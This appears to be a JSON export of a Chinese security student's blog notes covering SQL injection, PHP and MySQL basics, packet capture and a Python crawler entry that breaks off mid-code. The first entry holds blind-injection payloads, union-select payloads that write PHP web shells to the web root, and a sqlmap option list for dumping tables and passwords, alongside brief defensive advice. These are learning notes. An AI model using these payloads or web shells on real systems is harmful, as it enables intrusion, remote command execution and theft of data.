无法根据报错进行注入的判断  \n分类\n基于真假, 例:vince&#39; and ascii(substr(database(),1,1))=112#\n基于时间, 例:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n\n\n通过ascii(substr((xx语句), n, n))=x判断\n\n进行远程控制\n远程代码执行\n\nsqlvince&#39; union select &quot;&lt;?php @eval($_GET[&#39;test&#39;])?&gt;&quot;,2 into outfile &quot;/var/www/html/1.php&quot;#\n远程漏洞执行\n\nsqlvince&#39; union select &quot;&lt;?php system($_GET[&#39;cmd&#39;])?&gt;&quot;,2 into outfile &quot;/var/www/html/2.php&quot;#防范措施\n代码层面\n对输入进行严格的转义和过滤\n使用预处理和参数化(Parameterized)(推荐)\n\n\n网路层面\n通过WAF设备启用防SQL注入策略(类似防护系统)\n云端防护\n\n\n\nSQLmap使用文档介绍 - sqlmap 用户手册 (highlight.ink)\n\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; //带上cookie对URL进行注入探测\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; --current-db //获取数据库名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx --tables //获取表名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx --columns //获取列名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx -C xxx yyy,zzz,xxx --dump //获取指定列的信息tip:--start 1 --stop 10 (只获取前十列数据)\n\n\n参考:\ntxt --columns //查看所有列\n --dbs   //查看所有数据库\n --dump //查看字段具体信息\n --users //查看所有用户\n --current-db //查看当前的数据库\n --current-user //产看当前的用户\n --is-dba //查看是否是最高权限\n --passwords //查看所有密码\n –hostname //查看主机名\n privileges -U username //查看用户权限\n –roles //查看用户角色\n --tables //查看所有表help:\ntxt-r 1.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行\n-l log.txt          可以将代理的日志作为目标去检测[见下图]\n-m 1.txt            对于多个URL，可以一排一个写入文件后加载\n--force-ssl         对于使用SSL的URL要在后面加上这个参数\n--data              对于使用post方法，可以将参数写在data后面\n--param-del=&quot;&quot;          \n--cookie=&quot;&quot;  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1\n--random-agent          使用随机的user-agent\n--user-agent=&quot;&quot;  level 3    指定user-agent，如要检测它是否有漏洞level要高于2\n--header=&quot;\\n&quot;           指定头信息，如User-Agent:dsacs，大小写敏感，多个用\\n分隔\n--method=GET POST       设置提交方式，默认一个一个的尝试\n--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用\n--auth-cred &quot;user:pass&quot;     填写账号和密码\n --proxy=&quot;http:127.0.0.1:8087&quot;  使用代理\n--proxy-cred=&quot;name:pass&quot;    如果代理要密码的话\n--ignore-proxy          强制不使用代理\n--delay             请求延迟间隔，单位秒，默认无延迟\n--retries           链接失败重试次数3\n--timeout           链接超时时间30\n--randomize=&quot;param&quot;     使用和源参数类型长度一致的参数\nsqlmap -l l.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名\nsqlmap -l 2.log --scope=&quot;(19)?\\.168\\.20\\.(1|11|111)&quot;        同上，筛选19*.168.20.1/11/111这几个网段的IP\n--safe-url=&quot;url&quot;        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生\n--safe-freq 10          尝试的与正确的URL的交换频率\n--skip-urlencode        有的URL在get方式提交时没编码，就要用这个\n--eval=&quot;&quot;php代码      这个后面可以跟PHP代码，能够执行\n--keep-alive            保持连接会降低资源使用，但是不能与代理兼容\n--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容\n--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容\n--threads           最大并发数，默认1，最大不要超过10，盲注时一次返回一个字符【7次请求】\n-o              使用除了--threads的全部的优化参数\n-p              指定参数，使level失效\n-skip               排除不扫描的参数\n                对于伪静态网页，就在参数后面加*\n--dbms              接数据库管理系统，如MySQL\n--os                接系统，如Linux\n--invalid-bignum        使用大数作为假的值\n--invalid-logical       使用逻辑数作为假的值\n--no-cat            对于接收到的null不自动转换成空格\n--no-escape         不使用逃逸，就是不把&#39;转换成asii码形式\n--prefix            在参数前指定前缀\n--suffix            在参数后指定后缀\n--level             设置检查的等级，默认为1，共5个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息\n--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容\n--string            当页面含有这个字符串时为真\n--not-string            当页面不含这个字符串时为真\n--regexp            用正则表达式判断\n--code              当状态代码为*时为真\n--text-only         页面含有*时为真\n--titles            页面标题为*时为真\n--techniques \nB E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询\n--time-sec          \n--union-cols            联合查询第几列到第几列\n--union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位\n--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方\n-fingerprint            指纹信息\n--banner            版本信息\n--batch             按照软件默认设置，自动回答\n--count             计数\n-s              将这个会话保存下次继续\n-t              将这些数据保存\n--charset           强制设置数据库编码\n--crawl             设置蜘蛛爬行的深度\n--csv-del           设置下载的数据的分隔方式，默认是,\n--dbms-cred         设置数据库用户\n--flush-session         清空以前的会话数据\n--fresh-queries         不清空会话，重新查询\n--hex               一16进制编码的方式传输数据\n--output-dir            会话输出文件夹\n--parse-errors          显示MySQL错误信息\n--save              保存当前配置为文件\n-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.\n--answers           这个可以对一些特定的问题作出回答，在自动化注入中用\n--check-waf         检查是否含有waf等\n--identify-waf          彻底的检查waf等的信息\n--smart     当有大量目标时，这个就只检查基于错误的注入点\n--mobile    模拟智能手机去扫描\n--wizard    向导模式\n--purge-out 清除输出内容","slug":"第四次课程-XSS与SQL注入","date":"2024-02-02T07:12:03.000Z","categories_index":"","tags_index":"网络安全,学习日志,视频会议,XSS基础,SQL注入","author_index":"Myprefer"},{"id":"bcd80a5ebbb48bb852bbee5672f0a5b3","title":"第三周课程-SQL与PHP","content":"MySQL基本操作sql-- 创建数据库\nCREATE DATABASE 数据库名;\n\n-- 选择数据库\nUSE 数据库名;\n\n-- 创建表格\nCREATE TABLE 表格名 (\n    列1 数据类型,\n    列2 数据类型,\n    ...\n);\n\n-- 插入数据\nINSERT INTO 表格名 (列1, 列2, ...)\nVALUES (值1, 值2, ...);\n\n-- 查询数据\nSELECT 列1, 列2, ...\nFROM 表格名\nWHERE 条件;\n\n-- 更新数据\nUPDATE 表格名\nSET 列1 = 值1, 列2 = 值2, ...\nWHERE 条件;\n\n-- 删除数据\nDELETE FROM 表格名\nWHERE 条件;\n\n-- 删除表格\nDROP TABLE 表格名;\n\n-- 删除数据库\nDROP DATABASE 数据库名;\n\n-- 修改表格结构（添加列）\nALTER TABLE 表格名\nADD COLUMN 新列 数据类型;\n\n-- 修改表格结构（修改列）\nALTER TABLE 表格名\nMODIFY COLUMN 列名 数据类型;\n\n-- 修改表格结构（删除列）\nALTER TABLE 表格名\nDROP COLUMN 列名;\nORDER BY 字句，排列语句：\ntxtSELECT *或其他 FROM 数据表(可以是多个) ORDER BY 字段 ASC/DESC;ASC是升序排序，DESC是降序排序。     \n我们可以使用数字来进行判断列长度，比如： \n![](D:&#x2F;WeChat Files&#x2F;wxid_pv4vlb3mg6mv22&#x2F;FileStorage&#x2F;File&#x2F;2024-02&#x2F;image&#x2F;判断列的长度.jpg) \n观察不同点在哪\nUNION字句，联合查询\n所谓联合查询，就是查询不同的两个表，将要查询的信息合并显示。联合查询有两个子句：UNION 子句：查询后不显示重复数据UNION ALL 子句：查询后会显示重复数据            \nsqlSELECT (*或其他) FROM 数据表1 UNION SELECT (*或其他) FROM 数据表2；![](D:&#x2F;WeChat Files&#x2F;wxid_pv4vlb3mg6mv22&#x2F;FileStorage&#x2F;File&#x2F;2024-02&#x2F;image&#x2F;联合查询.jpg)\nMySQL其他知识点1、MySQL的注释：#从这开始到后面都是注释，--从这开始到后面都是注释，/*这全是注释*/2、常见的内置函数\nsqldatabase() : 显示当前数据库名称\ncurrent_user ： 显示当前用户\nversion() : 显示当前数据库版本![](D:&#x2F;WeChat Files&#x2F;wxid_pv4vlb3mg6mv22&#x2F;FileStorage&#x2F;File&#x2F;2024-02&#x2F;image&#x2F;内置函数.png)\nPHP基础说明\n全称”超文本预处理器”\nPHP在WEB中充当中间人的角色，它主要处理WEB数据\nPHP的工作流程:\n\n变量\n以 $开头, 如$_a\n大小写敏感\n\n超级全局变量\n$GLOBALS是一个包含了全部变量的全局组合数组,  变量的名字就是数组的键\nphp$a = 10;\nfunction test()\n&#123;\n    echo $GLOBALS[&#39;a&#39;]; #输出10\n    $GLOBALS[&#39;b&#39;] = 20;\n&#125;\ntest();\necho &#39;&lt;br&gt;&#39; . $b; # 输出 20\n$_SERVER包含服务器和执行环境的信息, 如头信息(header)、路径(path)、以及脚本位置等 ,例如:\nphp$_SERVER[&#39;SERVER_NAME&#39;];\n$_REQUEST用于收集HTML表单提交的数据, 例如:\nphp&lt;html&gt;\n&lt;body&gt;\n \n&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;\nName: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;\n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n \n&lt;?php \n$name = $_REQUEST[&#39;fname&#39;]; \necho $name; \n?&gt;\n \n&lt;/body&gt;\n&lt;/html&gt;\n$_POST用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”\n\n$_GET用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”, 也可以收集URL中发送的数据\n例如一个超链接包含要提交的了subject和web数据\nhtml&lt;a href=&quot;test_get.php?subject=PHP&amp;web=Myprefer.github.io&quot;&gt;Test $GET&lt;/a&gt;通过超链接打开test_get.php:\nphp&lt;?php \necho &quot;Study &quot; . $_GET[&#39;subject&#39;] . &quot; @ &quot; . $_GET[&#39;web&#39;];\n?&gt;输出:\ntxtStudy PHP @ Myprefer.github.io\n_ENV包含环境变量的信息\n\n\n运算符\n字符串运算符: $a = $a . $b连接 a, b两个字符串\n\n逻辑运算符xor:异或 \tx xor y如果 x 和 y 有且仅有一个为 true，则返回 true\n\n数组运算符:\n\n\n\n运算符\n名称\n描述\n\n\n\nx + y\n集合\nx 和 y 的集合\n\n\nx &#x3D;&#x3D; y\n相等\n如果 x 和 y 具有相同的键&#x2F;值对，则返回 true\n\n\nx &#x3D;&#x3D;&#x3D; y\n恒等\n如果 x 和 y 具有相同的键&#x2F;值对，且顺序相同类型相同，则返回 true\n\n\nx !&#x3D; y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx &lt;&gt; y\n不相等\n如果 x 不等于 y，则返回 true\n\n\nx !&#x3D;&#x3D; y\n不恒等\n如果 x 不等于 y，则返回 true\n\n\n\n组合比较符&lt;=&gt;\nphp$c = $a &lt;=&gt; $b;\n如果 $a &gt; $b, 则 $c 的值为 1。\n如果 $a &#x3D;&#x3D; $b, 则 $c 的值为 0。\n如果 $a &lt; $b, 则 $c 的值为 -1。\n\n\n\n关联数组\n关联数组是使用自己分配给数组的指定的键的数组。\nphp$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);php$age[&#39;Peter&#39;]=&quot;35&quot;;\n$age[&#39;Ben&#39;]=&quot;37&quot;;\n$age[&#39;Joe&#39;]=&quot;43&quot;;\n遍历关联数组\nphp$age = array(&#39;He&#39; =&gt; 35, &#39;She&#39; =&gt; 28, &#39;Me&#39; =&gt; 18);\n\nforeach ($age as $key =&gt; $value) &#123;\n    echo &#39;&#39; . $key . &#39; &#39; . $value . &#39;&#39;;\n    echo &#39;&lt;br&gt;&#39;;\n&#125;\n参考手册:PHP 5 Array 函数\n\n\n魔术常量\n__line__文件中的当前行号\n\n__FILE__文件的绝对路径和文件名。如果用在被包含文件中，则返回被包含的文件名\n\n__DIR__文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。等价于 dirname(__FILE__)\n\n__FUNCTION__函数名称\n\n__CLASS__类的名称\n\n__TRAIT__Trait 的名字\n\n__METHOD__类的方法名\n\n__NAMESPACE__当前命名空间的名称\n\n\n类与对象\n如下:\nphp&lt;?php\nclass phpClass &#123;\n  var $var1;\n  var $var2 = &quot;constant string&quot;;\n  \n  function myfunc ($arg1, $arg2) &#123;\n     [..]\n  &#125;\n  [..]\n&#125;\n?&gt;\n类的变量使用 var 来声明, 变量也可以初始化值。\n\n\n构造函数\nphpvoid __construct ([ mixed $args [, $... ]] )例如:\nphpfunction __construct( $par1, $par2 ) &#123;\n   $this-&gt;url = $par1;\n   $this-&gt;title = $par2;\n&#125;\n析构函数\nphpvoid __destruct ( void )在实例销毁时执行\n\n继承:\nphpclass Child extends Parent &#123;\n   // 代码部分\n&#125;\n接口\n\n使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容\n\n接口中定义的所有方法都必须是公有\n\n例如:\nphp&lt;?php\n\n// 声明一个&#39;iTemplate&#39;接口\ninterface iTemplate\n&#123;\n    public function setVariable($name, $var);\n    public function getHtml($template);\n&#125;\n\n\n// 实现接口\nclass Template implements iTemplate\n&#123;\n    private $vars = array();\n  \n    public function setVariable($name, $var)\n    &#123;\n        $this-&gt;vars[$name] = $var;\n    &#125;\n  \n    public function getHtml($template)\n    &#123;\n        foreach($this-&gt;vars as $name =&gt; $value) &#123;\n            $template = str_replace(&#39;&#123;&#39; . $name . &#39;&#125;&#39;, $value, $template);\n        &#125;\n \n        return $template;\n    &#125;\n&#125;\n\n\n\n日期与时间时间函数:phpstring date ( string $format [, int $timestamp ] )\n\n\n参数\n描述\n\n\n\nformat\n必需。规定时间戳的格式。\n\n\ntimestamp\n可选。规定时间戳。默认是当前的日期和时间。\n\n\n实例:\nphp&lt;?php\necho date(&quot;Y/m/d&quot;) . &quot;&lt;br&gt;&quot;;\necho date(&quot;Y.m.d&quot;) . &quot;&lt;br&gt;&quot;;\necho date(&quot;Y-m-d&quot;);\n?&gt;输出:\nphp2016/10/21\n2016.10.21\n2016-10-21include与require\n作用: 在执行php文件之前插入一个文件的内容\n\n区别–错误处理: include–warning,   require–error\n\n使用: \nphpinclude &#39;filename&#39;;\n# 或者\nrequire &#39;filename&#39;;\n\n文件操作\n打开:fopen()\n\n关闭:fclose()\n\n检测文件末尾:feof()\n\n逐行读取文件:\nphp&lt;?php\n$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);\n// 读取文件每一行，直到文件结尾\nwhile(!feof($file))\n&#123;\n    echo fgets($file). &quot;&lt;br&gt;&quot;;\n&#125;\nfclose($file);\n?&gt;\n\nCookie\n创建cookie:\nphpsetcookie(name, value, expire, path, domain);\nexpire:可选参数, cookie的过期时间, 秒数表示\npath:可选, 指定可以访问的cookie的页面路径\ndomain:可选, cookie可用域\n\n\n取回Cookie的值: $_COOKIE[&quot;name&quot;]isset($_COOKIE[&#39;name&#39;])用于确认是否已经设置cookie\n\n删除cookie:使过期日期变更为过去的时间点, 例如\nphpsetcookie(&quot;user&quot;, &quot;&quot;, time()-3600);\n\n与MySQL交互基本流程:\n\n连接:\nphpmysqli_connect(&quot;MySQL服务器地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;连接数据库名称（可选）&quot;,&quot;MySQL服务器使用的端口（默认3306）&quot;)\n选择数据库:\nphpmysqli_select_db(&quot;连接表示(必选参数)&quot;,&quot;数据库名称(必选参数)&quot;)\n执行SQL语句:\nphpmysqli_query(&quot;连接标识(必选参数)&quot;,&quot;查询语句(必选参数)&quot;)\n获取查询结果:\nphpmysqli_fetch_array()：//将结果集返回数组中。\nmysqli_fetch_object()：//从结果集中获取一行作为对象\nmysqli_fetch_row()：//从结果集中获取一行作为枚举数组\nmysqli_fetch_assoc()：//从结果集中获取一行作为关联数组\nmysqli_num_rows()：//获取查询结果集中的记录数\n关闭连接, 释放内存:\nphpmysqli_free_result(): \t//释放结果内存。\nmysqli_close()：//关闭先前打开的数据库连接。\n\n","slug":"第三周课程-SQL与PHP","date":"2024-02-01T07:08:19.000Z","categories_index":"","tags_index":"网络安全,学习日志,SQL基础,视频会议,PHP基础","author_index":"Myprefer"},{"id":"fc2ea42bf73e82995b845fcd034aa542","title":"MySQL数据库基础","content":"数据库基本操作MySQL登录&#x2F;退出\n登录: mysql -u root -p\n或mysql -u root -p -P 3306 -h 127.0.0.1指定IP和端口, 远程连接数据库\n\n退出: exit, quit, \\q\n\n\n一些解释\n数据库就相当于文件夹\n表就相当于文件\nSQL对大小写不敏感\nSQL语句末端必须使用分号\n\n注释sql# 注释1\n-- 注释2\n/* 注释3 */MySQL数据类型Text(文本)类型\n\n\n数据类型\n描述\n\n\n\nCHAR(size)\n保存固定长度的字符串。最多 255 个字符。\n\n\nVARCHAR(size)\n保存可变长度的字符串。最多 255 个字符。注释：如果值的长度大于 255，则被转换为 TEXT 类型。\n\n\nTINYTEXT\n存放最大长度为 255 个字符的字符串。\n\n\nTEXT\n存放最大长度为 65,535 个字符的字符串。\n\n\nMEDIUMTEXT\n存放最大长度为 16,777,215 个字符的字符串。\n\n\nLONGTEXT\n存放最大长度为 4,294,967,295 个字符的字符串。\n\n\nBLOB\n用于 BLOBs（Binary Large Objects, 用于存储大量二进制数据）。存放最多 65,535 字节的数据。\n\n\nMEDIUMBLOB\n用于 BLOBs（Binary Large Objects）。存放最多 16,777,215 字节的数据。\n\n\nLONGBLOB\n用于 BLOBs (Binary Large OBjects)。存放最多 4,294,967,295 字节的数据。\n\n\nENUM(x,y,z,etc.)\n允许您输入可能值的列表。可以在 ENUM 列表中列出最大 65535 个值。如果列表中不存在插入的值，则插入空值。注释：这些值是按照您输入的顺序排序的。可以按照此格式输入可能的值： ENUM(‘X’,’Y’,’Z’)\n\n\nSET\n与 ENUM 类似，不同的是，SET 最多只能包含 64 个列表项且 SET 可存储一个以上的选择。\n\n\nNumber(数字) 类型：\n\n\n数据类型\n描述\n\n\n\nTINYINT(size)\n带符号-128到127 ，无符号0到255。\n\n\nSMALLINT(size)\n带符号范围-32768到32767，无符号0到65535, size 默认为 6。\n\n\nMEDIUMINT(size)\n带符号范围-8388608到8388607，无符号的范围是0到16777215。 size 默认为9\n\n\nINT(size)\n带符号范围-2147483648到2147483647，无符号的范围是0到4294967295。 size 默认为 11\n\n\nBIGINT(size)\n带符号的范围是-9223372036854775808到9223372036854775807，无符号的范围是0到18446744073709551615。size 默认为 20\n\n\nFLOAT(size,d)\n带有浮动小数点的小数字。在 size 参数中规定显示最大位数。在 d 参数中规定小数点右侧的最大位数。\n\n\nDOUBLE(size,d)\n带有浮动小数点的大数字。\n\n\nDECIMAL(size,d)\n作为字符串存储的 DOUBLE 类型，允许固定的小数点。在 size 参数中规定显示最大位数。\n\n\n\n\n\n\n\n\n\n\n\n实际上int(size)所占多少存储空间并无任何关系。int(3)、int(4)、int(8) 在磁盘上都是占用 4 bytes 的存储空间。就是在显示给用户的方式有点不同\n例如：\nint的值为10 （指定zero fill）\ntxtint（9）显示结果为000000010\nint（3）显示结果为010\nDate(时间)类型:\n\n\n数据类型\n描述\n\n\n\nDATE()\n日期。格式：YYYY-MM-DD注释：支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’\n\n\nDATETIME()\n*日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS注释：支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’\n\n\nTIMESTAMP()\n*时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的秒数来存储。格式：YYYY-MM-DD HH:MM:SS注释：支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC\n\n\nTIME()\n时间。格式：HH:MM:SS注释：支持的范围是从 ‘-838:59:59’ 到 ‘838:59:59’\n\n\nYEAR()\n2 位或 4 位格式的年。注释：4 位格式所允许的值：1901 到 2155。2 位格式所允许的值：70 到 69，表示从 1970 到 2069。\n\n\n一些SQL基本操作操作手册\nSQL 快速参考\n\n查看\nshow databases;查看所有数据库\nshow tables; 查看数据库下的所有表\nSELECT * FROM &lt;表Name&gt;; 读取表的信息\ndesc &lt;表Name&gt;; 查看表的结构\n\n选择\nuse &lt;数据库Name&gt;;选择数据库\n\n新建\ncreate database db1: 创建新数据库db1\n\n建表:create table tb1(\n属性名 数据类型 [完整约束条件],属性名 数据类型 [完整约束条件],…….\n);数据库引擎等配置\n\n约束(Constraints):\n\nNOT NULL - 指示某列不能存储 NULL 值。\n\nUNIQUE - 保证某列的每行必须有唯一的值。\n\nPRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。\n\n每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束\n\nFOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。\n\nCHECK - 保证列中的值符合指定的条件。\n\nDEFAULT - 规定没有给列赋值时的默认值。\n\nAUTO_INCREMENT - 在新纪录插入表中时生成一个唯一的数字\n\n\n\n\n删除\ndrop database db1;删除数据库db1\n\n修改\nalter database db1 charset uf8; 将数据库字符集改为utf8\n\nSELECT语句: 选取数据\nSELECT column1, column2, ...FROM table_name;选取column1, column2\n\nSELECT * FROM table_name;选取全部\n\nDISTINCT: 用于返回唯一不同的值:SELECT DISTINCT column1, column2, ... FROM table_name;\n\n限制: SELECT * FROM Websites LIMIT 2;选取的是头两条记录\n\nWHERE子句: 用于过滤\n\n逻辑运算: 使用and&#x2F;or\n\nLIKE操作符: 指定where搜索模式:SELECT column1, column2, ... FROM table_name WHERE column (NOT) LIKE pattern;pattern为搜索模式\n\n通配符:通常与LIKE操作符一起使用\n\n\n\n通配符\n描述\n\n\n\n%\n替代 0 个或多个字符\n\n\n_\n替代一个字符\n\n\n[charlist]\n字符列中的任何单一字符\n\n\n[^charlist] 或 [!charlist]\n不在字符列中的任何单一字符\n\n\n\n\n\nORDER BY关键字: 排序\n\n用于select\nSELECT column1, column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;\nASC表示升序排序, DESC表示降序排序\n\n\n\nINSERT INTO 语句: 插入\n不指定, 直接加入到表: INSERT INTO table_name VALUES (value1,value2,value3,...);\n指定列,一一对应:INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,value2,value3,...);\n\nUPDATE语句: 更新(更改)\nUPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;\ncondition：修改条件，用于指定哪些数据要修改。\n\nDELETE: 删除表中的记录\n删除行: DELETE FROM table_name WHERE condition;\n删除所有: DELETE FROM table_name;\n\n连接(JOIN)\n下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。\n\nSQL函数SQL Aggregate 函数\nAVG() - 返回平均值SELECT AVG(column_name) FROM table_name\nCOUNT() - 返回行数\nMAX() - 返回最大值\nMIN() - 返回最小值\nSUM() - 返回总和\n\nGROUP BY 语句\n用于结合聚合(Aggregate)函数, 根据一个或多个列对结果进行分组\n\n语法:\nsqlSELECT column_name, aggregate_function(column_name)\nFROM table_name\nWHERE column_name operator value\nGROUP BY column_name;例如:\nsql+-----+---------+-------+------------+\n| aid | site_id | count | date       |\n+-----+---------+-------+------------+\n|   1 |       1 |    45 | 2016-05-10 |\n|   2 |       3 |   100 | 2016-05-13 |\n|   3 |       1 |   230 | 2016-05-14 |\n|   4 |       2 |    10 | 2016-05-14 |\n|   5 |       5 |   205 | 2016-05-14 |\n|   6 |       4 |    13 | 2016-05-15 |\n|   7 |       3 |   220 | 2016-05-15 |\n|   8 |       5 |   545 | 2016-05-16 |\n|   9 |       3 |   201 | 2016-05-17 |\n+-----+---------+-------+------------+运行SELECT site_id, SUM(access_log.count) AS nums FROM access_log GROUP BY site_id;后输出:\nsql+---------+-------+\n| site_id |  nums |\n+---------+-------+\n|       1 |    275|\n|       2 |    10 |\n|       3 |   521 |\n|       4 |    13 |\n|       5 |   750 |\n+---------+-------+\n\nHAVING 语句\n类似于WHERE语句, 但是可以和聚合函数一起使用\n\nSQL Scalar 函数\nUCASE() - 将某个字段转换为大写\nLCASE() - 将某个字段转换为小写\nMID() - 从某个文本字段提取字符，MySql 中使用\nSubString(字段，1，end) - 从某个文本字段提取字符\nLEN() - 返回某个文本字段的长度\nROUND() - 对某个数值字段进行指定小数位数的四舍五入\nNOW() - 返回当前的系统日期和时间\nFORMAT() - 格式化某个字段的显示方式\n\nMySQL 日期函数:\n\n\n函数\n返回示例&#x2F;描述\n\n\n\nNOW()\n2008-11-11 12:45:34\n\n\nCURDATE()\n2008-11-11\n\n\nCURTIME()\n12:45:34\n\n\nDATE()\n2008-11-11&#x2F;提取日期或日期&#x2F;时间表达式的日期部分\n\n\nEXTRACT()\n返回日期&#x2F;时间的单独部分\n\n\nDATE_ADD()\n向日期添加指定的时间间隔\n\n\nDATE_SUB()\n从日期减去指定的时间间隔\n\n\nDATEDIFF()\n返回两个日期之间的天数\n\n\nDATE_FORMAT()\n用不同的格式显示日期&#x2F;时间\n\n\ninformation_schema信息数据库介绍\nInformation_schema 是 MySQL 数据库中的一个系统数据库，它包含有关数据库服务器的元数据信息，这些信息以表的形式存储在 information_schema 数据库中。\n\nSCHEMATA 表\n存储有关数据库的信息，如数据库名、字符集、排序规则等。\n\nTABLES 表\n包含有关数据库中所有表的信息，如表名、数据库名、引擎、行数等。\n\nCOLUMNS 表\n包含有关表中列的信息，如列名、数据类型、是否允许 NULL 等。\n\nSTATISTICS 表\n提供有关表索引的统计信息，如索引名、列名、唯一性等。\n\nKEY_COLUMN_USAGE 表\n包含有关表中外键的信息，如外键名、列名、关联表等。\n\nREFERENTIAL_CONSTRAINTS 表\n存储有关外键约束的信息，如约束名、关联表等。\n\n跨库查询说明\n跨库查询是SQL注入的一种\n在权限较大时才可以进行跨库查询\n\n查询库\nSELECT SCHENA_NAME from information_schema.SCHEMATA limit n, 1;查询第n个(下标从0开始)库的名字\n输出:\nsql+-------------+\n| schema_name |\n+-------------+\n| myprefer    |\n+-------------+\n\n查询表\nselect table_name from information_schema.`TABLES` where table_schema&#x3D;’myprefer’ limit 0,1;输出:\nsql+------------+\n| table_name |\n+------------+\n| websites   |\n+------------+\n将数据库名转为16进制:select hex(&#39;myprefer&#39;);输出:\nsql+------------------+\n| hex(&#39;myprefer&#39;)  |\n+------------------+\n| 6D79707265666572 |\n+------------------+\n这样就可以把table_schema=&#39;myprefer&#39;里的&#39;myprefer&#39;替换成0x6D79707265666572即: select table_name from information_schema.`TABLES` where table_schema&#x3D;0x6D79707265666572 limit 0,1;\n\n\n查找列\nselect collation_name from information_schema.`columns` where table_schema&#x3D;0x6D79707265666572 and table_name&#x3D;’websites’; 获取全部列名  输出:\n\nsql+-------------+\n| column_name |\n+-------------+\n| id          |\n| name        |\n| url         |\n| alexa       |\n| country     |\n+-------------+查询结果\n有了上面查找到的信息, 我们就可以定位到目标信息, 比如要得到id和name:\nsql select id,name from myprefer.websites输出:\nsql+----+--------------+\n| id | name         |\n+----+--------------+\n|  1 | Google       |\n|  2 | 淘宝         |\n|  3 | 菜鸟教程     |\n+----+--------------+同理可以获取密码等信息\n\n\nINFORMATION_SCHEMA库SCHEMATA表\nSCHEMA_NAME字段: 数据库名\n\nTABLES表\nTABLE_SCHEMA字段: 数据库名\nTABLE_NAME字段: 表名\n\nCOLUMNS表\nTABLE_SCHEMA字段: 数据库名\nTABLE_NAME字段: 表名\nCOLUMN_NAME字段: 列名\n\n","slug":"MySQL数据库基础","date":"2024-01-28T15:13:22.000Z","categories_index":"","tags_index":"网络安全,学习日志,SQL基础","author_index":"Myprefer"},{"id":"d471c3c5657b4c4f477f2defc20d21ed","title":"小迪安全 P3","content":"\n\n\n\n\n\n\n\n\n学会不同对象采用不同抓包封包抓取技术分析\n抓包\n当需要知道应用程序等的IP, 域名时需要抓包后分析\n对不同的协议用不同的工具\nweb协议: Charles, Fiddler, Burpsuite\n其他非web协议: WireShark, 科来网络分析系统\n\n\n\n","slug":"小迪安全-P3","date":"2024-01-28T13:29:15.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"a7f9556995dc0359ec899cd406ee1ae6","title":"Python爬虫基础","content":"爬虫概念定义\n网络爬虫是伪装成客户端与服务端进行数据交互的程序。\n\n应用\n数据采集, 搜索引擎, 模拟操作, 软件测试, 网络安全(信息轰炸, web漏洞扫描)\n\n一般流程\n\n\n\n会话技术:Cookie(s)\n介绍: 指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据, 实际由服务器发送给客户端, 可以理解为一个凭证, 服务器可以以此辨别用户身份\n\n爬虫中使用cookie\n\n好处: 能够访问登录界面\n坏处: 容易被反爬\n\n\n\nSession\n含义: 在爬虫中, 指一个浏览器窗口从打开到关闭的这个期间\n目的: 在一个客户打开浏览器到关闭的这个期间, 发起的所有请求都可以被识别为同一个用户\n实现: 客户访问网站时, 生成一个包含SessionID的cookie, 用于服务器识别\nSession是储存在服务器上的数据\n\n\n爬虫基础urllib库request模块简单示例\n导入urllib请求模块:\npythonimport urllib.request\n发送GET请求:\npythonr = 